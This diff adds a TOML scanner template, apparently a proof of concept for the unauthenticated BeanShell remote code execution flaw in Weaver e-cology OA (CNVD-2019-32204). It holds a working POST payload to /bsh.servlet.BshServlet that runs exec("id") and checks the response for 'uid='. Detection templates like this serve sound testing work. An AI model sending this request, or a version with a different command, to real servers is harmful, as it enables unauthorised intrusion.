@@ -1,0 +1,33 @@
+[info]
+id = "POC-AVE-2026-0035"
+name = "泛微 e-cology BeanShell 远程代码执行漏洞 PoC"
+author = "AVE"
+severity = "critical"
+tags = ["cnvd-2019-32204", "rce", "beanshell", "ecology"]
+description = "泛微e-cology OA系统9.0及之前版本BeanShell组件存在未授权远程代码执行漏洞，通过向/bsh.servlet.BshServlet发送特制POST请求可执行任意系统命令"
+vuln_id = ["CNVD-2019-32204", "AVE-2026-0035"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/bsh.servlet.BshServlet"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[poc.requests.body]
+type = "raw"
+content = "bsh.script=exec(\"id\");&bsh.servlet.output=raw"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["uid="]
+expect = true
